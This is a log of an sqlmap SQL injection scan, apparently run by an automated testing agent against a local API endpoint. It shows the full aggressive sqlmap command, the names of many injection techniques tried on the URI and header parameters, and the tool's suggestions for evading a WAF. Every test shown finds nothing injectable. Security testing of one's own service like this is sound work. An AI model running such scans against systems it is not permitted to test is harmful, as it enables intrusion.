INFO - [20:22:41] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
INFO - [20:22:41] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
INFO - [20:22:41] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
INFO - [20:22:41] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
INFO - [20:22:41] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
INFO - [20:22:41] [INFO] testing 'Oracle AND time-based blind'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:22:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:22:41] [WARNING] reflective value(s) found and filtering out
INFO - [20:22:41] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - [20:22:41] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
INFO - [20:22:41] [WARNING] HTTP error codes detected during run:
INFO - 500 (Internal Server Error) - 77 times, 404 (Not Found) - 4 times
INFO - [*] ending @ 20:22:41 /2025-09-26/
INFO - Flushed sqlmap session for http://localhost:5000/products/test (log: attack-logs-dynamic\Get_a_specific_product_flush.log)
INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/products/test --output-dir 'attack-logs-dynamic\Get_a_specific_product_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
INFO -        __H__
INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
INFO - [*] starting @ 20:22:44 /2025-09-26/
INFO - [20:22:46] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_a_specific_product_sqlmap' as the output directory
INFO - [20:22:47] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
INFO - [20:22:47] [INFO] testing connection to the target URL
INFO - [20:22:47] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
INFO - [20:22:47] [INFO] testing if the target URL content is stable
INFO - [20:22:47] [INFO] target URL content is stable
INFO - [20:22:47] [INFO] testing if URI parameter '#1*' is dynamic
INFO - [20:22:47] [INFO] URI parameter '#1*' appears to be dynamic
INFO - [20:22:47] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
INFO - [20:22:47] [INFO] testing for SQL injection on URI parameter '#1*'
INFO - [20:22:47] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:22:48] [WARNING] reflective value(s) found and filtering out
INFO - [20:22:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:22:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:22:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:22:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:22:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:22:52] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:22:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:22:53] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:22:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:22:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:22:55] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:22:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:22:56] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:22:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:22:57] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:22:58] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:22:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:23:00] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:23:01] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:23:02] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:23:03] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:23:04] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:23:05] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:23:06] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:23:07] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:23:07] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:23:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:23:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:23:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:23:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:23:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:23:08] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:23:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:23:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:23:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:23:08] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:23:08] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:23:08] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:23:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:23:08] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:23:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:23:08] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:23:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:23:08] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:23:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:08] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:08] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:08] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:23:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:23:08] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:08] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:09] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:09] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:09] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:09] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:09] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:09] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:23:09] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:09] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:23:10] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:23:10] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:23:10] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:23:11] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:23:11] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:23:12] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:23:12] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:23:13] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:23:13] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
INFO - [20:23:14] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:23:14] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:23:15] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:23:15] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:23:16] [WARNING] URI parameter '#1*' does not seem to be injectable
INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
INFO - [20:23:16] [INFO] testing if parameter 'User-Agent' is dynamic
INFO - [20:23:16] [WARNING] parameter 'User-Agent' does not appear to be dynamic
INFO - [20:23:16] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
INFO - [20:23:16] [INFO] testing for SQL injection on parameter 'User-Agent'
INFO - [20:23:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:23:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:23:17] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:23:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:23:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:23:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:23:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:23:18] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:23:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:23:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:23:19] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:23:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:23:20] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:23:21] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:23:21] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:23:21] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:23:22] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:23:23] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:23:24] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:23:24] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:23:25] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:23:26] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:23:26] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:23:27] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:23:28] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:23:28] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:23:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:23:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:23:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:23:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:23:29] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:23:30] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:23:30] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:23:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:23:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:23:30] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:23:30] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:23:30] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:23:30] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:23:30] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:23:30] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:23:30] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:23:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:30] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:30] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:23:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:23:30] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:30] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:30] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:30] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:23:30] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:30] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:23:31] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:23:31] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:23:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:23:31] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:23:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:23:32] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:23:32] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:23:33] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:23:33] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:23:33] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:23:34] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:23:35] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:23:36] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:23:37] [WARNING] parameter 'User-Agent' does not seem to be injectable
INFO - [20:23:37] [INFO] testing if parameter 'Referer' is dynamic
INFO - [20:23:37] [WARNING] parameter 'Referer' does not appear to be dynamic
INFO - [20:23:37] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
INFO - [20:23:37] [INFO] testing for SQL injection on parameter 'Referer'
INFO - [20:23:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:23:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:23:38] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:23:38] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:23:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:23:39] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:23:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:23:39] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:23:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:23:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
INFO - [20:23:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
INFO - [20:23:40] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:23:41] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
INFO - [20:23:41] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
INFO - [20:23:41] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:23:42] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
INFO - [20:23:42] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:23:43] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
INFO - [20:23:43] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:23:44] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
INFO - [20:23:44] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:23:45] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
INFO - [20:23:46] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:23:46] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
INFO - [20:23:47] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:23:48] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
INFO - [20:23:48] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
INFO - [20:23:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
INFO - [20:23:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
INFO - [20:23:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
INFO - [20:23:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
INFO - [20:23:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
INFO - [20:23:48] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
INFO - [20:23:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
INFO - [20:23:48] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
INFO - [20:23:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
INFO - [20:23:49] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
INFO - [20:23:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
INFO - [20:23:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
INFO - [20:23:49] [INFO] testing 'Oracle boolean-based blind - Parameter replace'
INFO - [20:23:49] [INFO] testing 'Oracle boolean-based blind - Parameter replace (original value)'
INFO - [20:23:49] [INFO] testing 'Informix boolean-based blind - Parameter replace'
INFO - [20:23:49] [INFO] testing 'Informix boolean-based blind - Parameter replace (original value)'
INFO - [20:23:49] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace'
INFO - [20:23:49] [INFO] testing 'Microsoft Access boolean-based blind - Parameter replace (original value)'
INFO - [20:23:49] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
INFO - [20:23:49] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
INFO - [20:23:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
INFO - [20:23:49] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
INFO - [20:23:49] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:49] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:49] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:49] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)'
INFO - [20:23:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause'
INFO - [20:23:49] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:49] [INFO] testing 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:49] [INFO] testing 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause'
INFO - [20:23:49] [INFO] testing 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause'
INFO - [20:23:49] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
INFO - [20:23:49] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
INFO - [20:23:50] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
INFO - [20:23:50] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
INFO - [20:23:50] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
INFO - [20:23:50] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
INFO - [20:23:50] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
INFO - [20:23:51] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
INFO - [20:23:51] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
INFO - [20:23:52] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
INFO - [20:23:52] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
INFO - [20:23:52] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
INFO - [20:23:53] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
INFO - [20:23:54] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
INFO - [20:23:55] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
INFO - [20:23:56] [WARNING] parameter 'Referer' does not seem to be injectable
INFO - [20:23:56] [INFO] testing if parameter 'Host' is dynamic
INFO - [20:23:56] [WARNING] parameter 'Host' does not appear to be dynamic
INFO - [20:23:56] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
INFO - [20:23:56] [INFO] testing for SQL injection on parameter 'Host'
INFO - [20:23:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
INFO - [20:23:56] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
INFO - [20:23:57] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
INFO - [20:23:58] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:23:58] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
INFO - [20:23:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:23:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
INFO - [20:23:59] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
INFO - [20:23:59] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
